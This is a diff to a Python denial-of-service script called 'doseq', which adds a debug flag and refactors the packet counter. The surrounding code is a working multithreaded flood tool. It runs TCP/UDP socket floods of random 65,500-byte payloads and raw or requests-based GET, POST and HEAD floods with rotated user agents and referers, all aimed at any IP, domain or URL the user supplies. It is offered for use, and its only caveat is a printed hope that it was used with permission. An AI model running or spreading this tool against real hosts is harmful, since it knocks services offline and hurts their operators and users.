@@ -25,8 +25,15 @@ attacks = ["get", "post", "head", "tcp", "udp"]
 os.system("cls || clear")
 
 
-def sock_flood():
+def add_request():
     global i
+    lock.acquire()
+    i += 1
+    lock.release()
+    print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+
+
+def sock_flood():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if attack == 'tcp' else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -34,10 +41,8 @@ def sock_flood():
             s.connect((target, port))
             for _ in range(500):
                 s.send(random._urandom(65500))
-                lock.acquire()
-                i += 1
-                lock.release()
-                print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+                if debug:
+                    add_request()
                 if isKilled():
                     break
                 time.sleep(delay)
@@ -55,7 +60,6 @@ def sock_flood():
 
 
 def get_attack():
-    global i
     while True:
         try:
             get_packet = str("GET / HTTP/1.1\r\nHost: {target}\n\n User-Agent: {random.choice(headers_useragents)}\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
@@ -64,10 +68,8 @@ def get_attack():
             s.connect((target, port))
             if s.sendto(get_packet, (target, port)):
                 s.shutdown(1)
-                lock.acquire()
-                i += 1
-                lock.release()
-                print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+                if debug:
+                    add_request()
             else:
                 s.shutdown(1)
             if isKilled():
@@ -86,7 +88,6 @@ def get_attack():
 
 
 def post_attack():
-    global i
     while True:
         try:
             post_packet = f'POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.encode("ascii")
@@ -96,10 +97,8 @@ def post_attack():
             s.send(post_packet)
             s.send(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890").encode('ascii'))
             s.close()
-            lock.acquire()
-            i += 1
-            lock.release()
-            print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+            if debug:
+                add_request()
             if isKilled():
                 break
             time.sleep(delay)
@@ -116,7 +115,6 @@ def post_attack():
 
 
 def head_attack():
-    global i
     while True:
         try:
             head_packet = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nAccept: text/html\r\n\r\n".encode("ascii")
@@ -125,10 +123,8 @@ def head_attack():
             s.connect((target, port))
             s.send(head_packet)
             s.close()
-            lock.acquire()
-            i += 1
-            lock.release()
-            print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+            if debug:
+                add_request()
             if isKilled():
                 break
             time.sleep(delay)
@@ -145,14 +141,11 @@ def head_attack():
 
 
 def request_get_attack():
-    global i
     while True:
         try:
             req = requests.get(url, headers={'User-Agent': random.choice(headers_useragents), 'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
-            lock.acquire()
-            i += 1
-            lock.release()
-            print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+            if debug:
+                add_request()
             if isKilled():
                 break
             time.sleep(delay)
@@ -169,14 +162,11 @@ def request_get_attack():
 
 
 def request_post_attack():
-    global i
     while True:
         try:
             req = requests.post(url, headers={'User-Agent': random.choice(headers_useragents), "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Referer": random.choice(headers_referers)}, data={'test': 'test'}, timeout=5)
-            lock.acquire()
-            i += 1
-            lock.release()
-            print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+            if debug:
+                add_request()
             if isKilled():
                 break
             time.sleep(delay)
@@ -193,14 +183,11 @@ def request_post_attack():
 
 
 def request_head_attack():
-    global i
     while True:
         try:
             req = requests.head(url, headers={'User-Agent': random.choice(headers_useragents), "Accept": 'text/html'}, timeout=5)
-            lock.acquire()
-            i += 1
-            lock.release()
-            print("[" + rd + "Flooding" + wi + f"]: (=>{target}:{port}<=) Packets sent :: [" + yl + f"{i}" + wi + "]", end='\r')
+            if debug:
+                add_request()
             if isKilled():
                 break
             time.sleep(delay)
@@ -229,11 +216,17 @@ def cnet(server='www.google.com', port=80) -> bool:
 def quit(sig, fream):
     print(rd + "\n[" + yl + "!" + rd + "]" + yl + " User requested shutdown. " + rd + "..." + wi)
     time.sleep(1)
+    newline = ''
     if started:
-        print(rd + "  [" + yl + "~" + rd + "]" + yl + " Aborting Threads" + rd + "..." + wi)
+        print(rd + "  [" + yl + "~" + rd + "]" + yl + f" Aborting {len(THREADS)} Threads" + rd + "..." + wi)
         kill()
         time.sleep(2.5)
-    print(wi + "\n[" + gr + "*" + wi + "] Thanks For Using Doseq Script :)")
+        if debug:
+            newline = "\n"
+            for t in THREADS:
+                print("[" + gr + "*" + wi + f"] Thread-{t.ident} " + yl + " :: " + gr + " Stopped" + rd + "!" + wi)
+
+    print(wi + newline + "[" + gr + "*" + wi + "] Thanks For Using Doseq Script :)")
     if started:
         print("[" + gr + "*" + wi + "] I Hope You Used It With Permission" + yl + "!?" + wi)
     sys.exit(0)
@@ -244,7 +237,7 @@ def update_doseq():
         print(rd + "\n[ " + yl + "!" + rd + "]" + yl + f" Unable To Check For Updates {'Please Check Your Internet Connection' if not cnet() else ''} " + rd + "!!!" + wi)
         sys.exit(1)
     with open(version_path, 'r') as version:
-         current_version = version.read().strip()
+        current_version = version.read().strip()
     print(wi + "[" + gr + "I" + wi + "] Current Version: [" + yl + current_version + wi + "]")
     print(wi + "  [" + yl + "~" + wi + "]" + yl + " Check For Updates" + wi + "...")
     con = http.HTTPSConnection("raw.githubusercontent.com")
@@ -269,14 +262,14 @@ def update_doseq():
 
 banner = """\033[1;31m
                    .-"      "-.
-                  /            \ 
+                  /            \
                  |  \033[1;33m $JOKER11\033[1;31m   |
-                 |,  .-.  .-.  ,| 
-                 | )(__/  \__)( | 
-                 |/     /\     \| 
-       (@_       (_     ^^     _) 
+                 |,  .-.  .-.  ,|
+                 | )(__/  \__)( |
+                 |/     /\     \|
+       (@_       (_     ^^     _)
   _     ) \_______\__|IIIIII|__/__________________________
- (_)@8@8{}<________|-\IIIIII/-|\033[1;32m_A_N_O_N_Y_M_O_U_S_A_R_A_B_\033[1;31m>
+ (_)@8@8{}<________|-\IIIIII/-|_\033[1;32mA\033[1;31m_\033[1;32mN\033[1;31m_\033[1;32mO\033[1;31m_\033[1;32mN\033[1;31m_\033[1;32mY\033[1;31m_\033[1;32mM\033[1;31m_\033[1;32mO\033[1;31m_\033[1;32mU\033[1;31m_\033[1;32mS\033[1;31m_\033[1;32mA\033[1;31m_\033[1;32mR\033[1;31m_\033[1;32mA\033[1;31m_\033[1;32mB\033[1;31m_>
         )_/        \          /
        (@           `--------` \033[1;37mDD0$Eq\033[1;31m!\033[1;37m
 
@@ -294,7 +287,7 @@ Usage: python3 ./doseq.py [OPTIONS...]
 OPTIONS:
        |
     |--------
-    | -s/--server   <target_(IP,domain,url)>                  ::> Specify target IP [OR] Domain [OR] Url (Required)
+    | -s/--server   <target_(IP,domain,url)>                  ::> Specify target ip,domain or Url (Required)
     |--------
     | -p/--port     <target_port>                             ::> Specify target port number Default(80) (Optional)
     |--------
@@ -302,11 +295,13 @@ OPTIONS:
     |--------
     | -a/--attack   <attack_type_(GET,POST,HEAD,TCP,UDP)>     ::> Specify attack type to be used Default(random) (Optional)
     |--------
-    | -d/--delay    <delay time in seconds>                   ::> Specify delay time inside threads Default(0.1) (Optional)
+    | -d/--delay    <delay time in seconds>                   ::> Specify delay time inside threads Default(0.1s) (Optional)
     |--------
-    | -S/--sleep    <sleep time in seconds>                   ::> Specify sleep time between Starting threads Default(disabled) (Optional)
+    | -S/--sleep    <sleep time in seconds>                   ::> Specify sleep time between started threads Default(0s) (Optional)
     |--------
-    | -u/--update                                             ::> Check For Updates
+    | -D/--debug                                              ::> Display more output
+    |--------
+    | -u/--update                                             ::> Check for updates
 -------------
 Examples:
         |
@@ -315,7 +310,7 @@ Examples:
      |--------
      | python3 doseq.py -s mydomain.com -p 443
      |--------
-     | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp -d 0.30 -S 0.60
+     | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp -d 0.30 -S 0.60 --debug
      |--------
      | python3 doseq.py --update
 
@@ -327,6 +322,7 @@ parse.add_option('-t', '--threads', type=str, dest='threads')
 parse.add_option('-a', '--attack', type=str, dest='attack')
 parse.add_option('-d', '--delay', type=str, dest='delay')
 parse.add_option('-S', '--sleep', type=str, dest='sleep')
+parse.add_option('-D', '--debug', action='store_true', dest='debug', default=False)
 parse.add_option('-u', '--update', action='store_true', dest='update', default=False)
 
 (options, args) = parse.parse_args()
@@ -337,7 +333,8 @@ attack = options.attack
 delay = options.delay
 sleep = options.sleep
 update = options.update
-opts = [target, port, threads, attack, delay, sleep, update]
+debug = options.debug
+opts = [target, port, threads, attack, delay, sleep, update, debug]
 
 if target:
     if not port:
@@ -410,13 +407,12 @@ time.sleep(1.5)
 os.system("cls || clear")
 print("\n" + banner)
 print(wi + "[" + gr + "*" + wi + "]" + yl + "-=-=-=-=-=-=-= " + gr + "Attack Has Been Start On (" + yl + f"{target}:{port}" + gr + ")" + yl + " -=-=-=-=-=-=-=" + wi + "[" + gr + "*" + wi + "]")
-print("[" + yl + "I" + wi + "]  Attacking Using[ " + yl + attack.upper() + wi + " ] On Target...")
+print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] requests started On Target...")
 print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
 time.sleep(1.5)
 
 threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp', 'udp')) else threads
 started = True
-
 for _ in range(threads):
 
     if attack == 'get':
@@ -446,7 +442,6 @@ for _ in range(threads):
         t6.daemon = True
         t6.start()
         THREADS.append(t6)
-
     else:
         t7 = threading.Thread(target=sock_flood)
         t7.daemon = True
